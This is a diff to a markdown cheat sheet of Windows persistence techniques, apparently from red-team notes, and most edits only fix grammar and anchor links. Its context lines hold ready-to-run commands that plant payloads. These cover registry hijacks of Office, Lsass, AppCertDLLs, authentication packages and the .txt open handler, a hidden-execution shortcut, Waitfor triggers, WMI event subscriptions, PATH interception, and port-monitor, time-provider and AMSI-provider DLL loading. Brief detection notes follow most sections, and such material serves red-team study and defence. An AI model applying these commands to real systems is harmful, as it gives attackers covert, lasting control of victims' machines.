@@ -10,7 +10,7 @@
 	* [Waitfor](#Waitfor)
 * [Admin](#Admin)
 	* [Debugger](#Debugger)
-	* [WMI](#Using-WMI-(Windows-Management-Instrumentation))
+	* [WMI](#Using-WMI-Windows-Management-Instrumentation)
 	* [AppInit](#AppInit)
 	* [Lsass](#System-process-Lsass)
 	* [Netsh](#Netsh)
@@ -20,7 +20,7 @@
 	* [Path Interception](#Path-Interception)
 	* [Port Monitors](#Port-Monitors)
 	* [Time providers](#Time-providers)
-	* [AMSI](#AMSI(Antimalware-Scan-Interface))
+	* [AMSI](#AMSI-Antimalware-Scan-Interface)
 	* [COM Hijacking](#COM-Hijacking)
 
 
@@ -36,7 +36,7 @@
 ```powershell
 reg add "HKCU\Software\OfficeMicrosoft\ test\Special\Perf" /t REG_SZ /d C:\path\to\badguy.dll
 ```
-Every time , when user start new session Microsoft office apps,  your payload will start too.
+Every time when user starts a new session in Microsoft office apps,  your payload will be executed.
 
 #### Detection:
 User can see malicious string in reg **HKCU**
@@ -45,17 +45,17 @@ User can see malicious string in reg **HKCU**
 
 ## DLL Search Order Hijacking
 
-Some programms search **.dll** files, which they need in their local directory. You can simply change this **dll's** to yours. (If programm has admin or system privilliges your dll will also have this privilliges)
+Some programs search for necessary **.dll** files in their local directory. You can simply change this **dll's** to yours. (If program runs with admin or system privileges, your dll will also have that privileges)
 
 #### Detection:
-User can see malicious dll in folders of programms.
+User can see malicious dll inside program folders.
 
 </br></br>
 
 ## Screensaver
-Screensavers are part of Windows functionality and enable users to put a screen message or a graphic animation after a period of inactivity. This feature of Windows it is known to be abused by threat actors as a method of persistence. This is because screensavers are executable files that have the **.scr** file extension and are executed via the scrnsave.scr utility.
+Screensavers are part of Windows functionality and let users to display a screen message or a graphic animation after some period of inactivity. This feature of Windows is known to be abused by threat actors as a method of persistence. This is because screensavers are executable files that have the **.scr** file extension and are executed via the scrnsave.scr utility.
 
-Since the **.scr** files are essentially executables both extensions can be used to the file that will act as the implant.
+Since the **.scr** files are essentially executables both extensions can be used to the file that will act as an implant.
 
 *refer: https://pentestlab.blog/2019/10/09/persistence-screensaver/*
 
@@ -87,12 +87,12 @@ User can see malicious strings in reg **HKCU**
 </br></br>
 
 ## Shortcut Modification
-You can change shortcuts properties for hidden command execution. For example paste in shortcut target this simple command:
+You can change shortcut properties for stealth command execution. For example modify target shortcut to run this command:
 ```powershell
 powershell.exe -c "powershell.exe -w hidden  C:\path\to\badguy.exe ; C:\path\to\shortcut_program.exe"
 
 ```
-When user click this shortcut, system start **badguy.exe** and **shortcut_program.exe **
+When user clicks this shortcut, system will start **badguy.exe** and **shortcut_program.exe ** simultaneously
 
 #### Detection:
 In process manager user can see malicious process.
@@ -101,13 +101,13 @@ In process manager user can see malicious process.
 
 ## Waitfor
 
-Waitfor is a Microsoft binary which is typically used to synchronize computers across a network by sending signals.  The binary is stored in *C:\Windows\System32* folder. Both hosts (sender and receiver) needs to be on the same network segment.
+Waitfor is a Microsoft binary which is typically used to synchronize computers across a network by sending signals.  The binary is stored in *C:\Windows\System32* folder. Both hosts (sender and receiver) need to be on the same network segment.
 
 ```powershell
 waitfor badguy && C:\path\to\badguy.exe;
 ```
 
-You can run this command with endless loop, or Planning service, or make from this PowerShell [script](https://github.com/3gstudent/Waitfor-Persistence) which is storing the command in a **WMI** class in order to enable the wait mode continuously..
+You can run this command in endless loop, or using Task Scheduler, or use this PowerShell [script](https://github.com/3gstudent/Waitfor-Persistence) which stores the command in a **WMI** class to enable the wait mode continuously..
 #### Example:
 
 ```powershell
@@ -132,7 +132,7 @@ iex $exec | Out-Null
 	```
 
 - Or you can add *Your_Waitfor-Persistence_script.ps1* in *C:\Windows\System32\WindowsPowerShell\v1.0* 
-   And every time, when you start powershell, this module will start too
+   And with every powershell launch this module will be started too
   ```powershell 
 	copy Your_Waitfor-Persistence_script.ps1 C:\Windows\System32\WindowsPowerShell\v1.0\Your_Waitfor-Persistence_script_.ps1
   ```
@@ -152,7 +152,7 @@ You will send a signal to target_macheine, and your **badguy.exe** will be execu
 *refer: https://pentestlab.blog/2020/02/04/persistence-waitfor/*
 
 #### Detection:
-If you import module , user can see imported module's by
+User can see imported modules by executing
 
 ```powershell
 write-host "$PSModulePath"
@@ -192,14 +192,14 @@ Typically persistence via WMI event subscription requires creation of the follow
 -   **__FilterToConsumerBinding** // Binds Filter and Consumer Classes
 
 #### Example:
-Execution of the following commands will create in the name space of _“**root\subscription**“_ three events. The arbitrary payload will executed within 60 seconds every time Windows starts.
+Execution of the following commands will create three events in the _“**root\subscription**“_ namespace. The arbitrary payload will be executed within 60 seconds every time Windows starts.
 ```powershell
  wmic /NAMESPACE:"\\root\subscription" PATH __EventFilter CREATE Name="PentestLab", EventNameSpace="root\cimv2",QueryLanguage="WQL", Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
  wmic /NAMESPACE:"\\root\subscription" PATH CommandLineEventConsumer CREATE Name="PentestLab", ExecutablePath="C:\Windows\System32\pentestlab.exe",CommandLineTemplate="C:\Windows\System32\pentestlab.exe"
  wmic /NAMESPACE:"\\root\subscription" PATH __FilterToConsumerBinding CREATE Filter="__EventFilter.Name=\"PentestLab\"", Consumer="CommandLineEventConsumer.Name=\"PentestLab\""
 ```
 
-Insert in database new event and set timer for execution.
+Add new event to database and set the execution timer.
 
 
 #### Detection:
@@ -230,7 +230,7 @@ Turn LoadAppInit_DLLs to 1 and add in AppInit_DLLs path to malware.
 
 #### Detection:
 
-User can see, that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows* or  *HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows* set to 1 and also see malicious string at the same path in  **AppInit_DLLs**.
+User can see that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\Microsoft\Windows NT\CurrentVersion\Windows* or  *HKLM\Software\Microsoft\Windows NT\CurrentVersion\Windows* is set to 1 and also can see malicious string at the same path in  **AppInit_DLLs**.
 
 
 </br></br>
@@ -242,7 +242,7 @@ User can see, that value of **LoadAppInit_DLLs** at *HKLM\Software\Wow6432Node\M
 reg add "HKLM\system\currentcontrolset\control\lsa" /v "Notification Packages" /t reg_multi_sz /d "c:\path\to\badguy.dll" /f
 
 ```
-Just add library for *Lsass* process
+Just add a library for *Lsass* process
 
 #### Detection:
 User can see malicious string in reg **HKLM**
@@ -273,7 +273,7 @@ User will see *Netsh* program in autorun (but it's hard to see **badguy32.dll**)
 reg add "HKLM\System\CurrentControlSet\Control\Session Manager" /v AppCertDLLs /t REG_SZ /d "C:\path\to\badguy.dll"
 
 ```
-*badguy.dll*  load when Windows use Api functions like: *CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, WinExec*.
+*badguy.dll* loads when Windows uses Api functions like: *CreateProcess, CreateProcessAsUser, CreateProcessWithLoginW, CreateProcessWithTokenW, WinExec*.
 
 
 
@@ -290,7 +290,7 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Authentication Packages" /v p
 
 ```
 
-*badguy.exe* execute when system load packets **Authentication Pack** on start of the system
+*badguy.exe* executes when system loads packets **Authentication Pack** on system startup
 #### Detection:
 User can see malicious string in reg **HKLM**
 
@@ -303,23 +303,22 @@ User can see malicious string in reg **HKLM**
 reg add "HKEY_CLASSES_ROOT\textfile\shell\open\command" /v (Default) /t REG_SZ /d "C:\path\to\badguy.exe"
 ```
 
-*badguy.exe* execute when user open file with **.txt** extension
+*badguy.exe* executes when user opens file with **.txt** extension
 #### Detection:
 User can see malicious string in reg **HKCR**
 
 </br></br>
 
 ## Path Interception
-If some path is set ,for example, before *c:\Windows\System32*  it mean that all common progs in *System32* first will be checked in other directory.
-You can change **Path** variable to insert your "malicious" directory with progs, with names like in *System32*. When this com	mands executes , your programs runs.
+If some path is set, for example, before *c:\Windows\System32*  it means that all common programs inside *System32* first will be searched in other directories.
+You can change **Path** variable to insert your "malicious" directory with programs, with names identical to programs inside *System32*. When this com	mands executes, your programs runs.
 
 #### Example:
 ```powershell
 SETX /M PATH "C:\badguy;%PATH%"
 
 ```
-Where in *badguy* folder you put programs for commands, that you need
-(for more  secrecy you can join(with *joiner* maybe) your malware soft with program(s) which  you replace)
+Programs ran by their names (e.g. from terminal) will be executed from *badguy* folder if they exist in it.
 
 
 #### Detection:
@@ -328,7 +327,7 @@ User can see **PATH** variable
 </br></br>
 
 ## Port Monitors
-The print spooler service is responsible for managing printing jobs in Windows operating systems. Interaction with the service is performed through the Print Spooler API which contains a function (**AddMonitor**) that can be used to install local port monitors and connects the configuration, data and monitor files. This function has the ability to inject a DLL into the **spoolsv.exe** process and by creating a registry key red team operators can achieve persistence on the system. 
+The Print Spooler service is responsible for managing printing jobs in OS Windows. Interaction with the service is performed through the Print Spooler API which contains a function (**AddMonitor**) that can be used to install local port monitors and connect the configuration, data and monitor files. This function has the ability to inject a DLL into the **spoolsv.exe** process and by creating a registry key red team operators can achieve persistence on the system. 
 
 *refers:* 
 *
@@ -364,11 +363,11 @@ copy C:\path\to\your_binary.exe %systemroot%
 ```
 Start your binary.
 
-Add your dll in registry
+Add your dll to registry
 ```powershell
 reg add "hklm\system\currentcontrolset\control\print\monitors\persistence" /v "Driver" /d "badguy.dll" /t REG_SZ
 ```
-On the next reboot the *spoolsv.exe* process will load all the driver DLL files that exist in the Monitors registry key and are stored in Windows folder System32.
+With every system startup the *spoolsv.exe* process will load all the driver DLL files that exist in the Monitors registry key and stored in System32 folder.
 
 #### Detection:
 
@@ -378,14 +377,14 @@ User can see malicious string in reg **HKLM**
 
 ## Time providers
 
- Time providers are implemented in the form of a DLL file which resides in System32 folder. The service **W32Time** initiates during the startup of Windows and loads the w32time.dll.Since the associated service is starting automatically during the startup of Windows it can be used as a persistence mechanism.
+ Time providers are implemented in the form of a DLL file which resides in System32 folder. The service **W32Time** initiates during the startup of Windows and loads the w32time.dll. Since the associated service is starting automatically during Windows startup, it can be used as a persistence mechanism.
  
  
 ```powershell
 reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\W32Time\TimeProviders\NtpClient" /v DllName /t REG_SZ /d "C:\path\to\badguy.dll"
 ```
 
-Add *badguy.dll* in *W32Time* Timeprovider service. NtpClient starts with system for synsynchronizing time and also your *dll* with it.
+Add *badguy.dll* to *W32Time* Timeprovider service. NtpClient starts with system for time synsynchronization and will execute your *dll*.
 
 *refer: https://pentestlab.blog/2019/10/22/persistence-time-providers/*
 
@@ -395,7 +394,7 @@ User can see malicious **dll** in reg of **W32Time**
 
 </br></br>
 
-## AMSI(Antimalware Scan Interface)
+## AMSI (Antimalware Scan Interface)
 
 The following code represents the fake AMSI provider which upon execution of the trigger will open *badguy.exe*
 
@@ -623,12 +622,12 @@ STDAPI DllUnregisterServer()
 
 
 Compile this C++ code to **your_compiled_ AMSI_provider.dll**
-The AMSI Provider can be registered with the system with the *regsvr32* utility.
+The AMSI Provider can be registered in the system with the *regsvr32* utility.
 ```powershell
 regsvr32 your_compiled_ AMSI_provider.dll
 
 ```
-When the keyword(**badguy** in our case) is passed on a PowerShell console the target payload will executed.
+When the keyword(**badguy** in our case) is passed to a PowerShell console, our payload will be executed.
 
 *refer: https://pentestlab.blog/2021/05/17/persistence-amsi/*
 
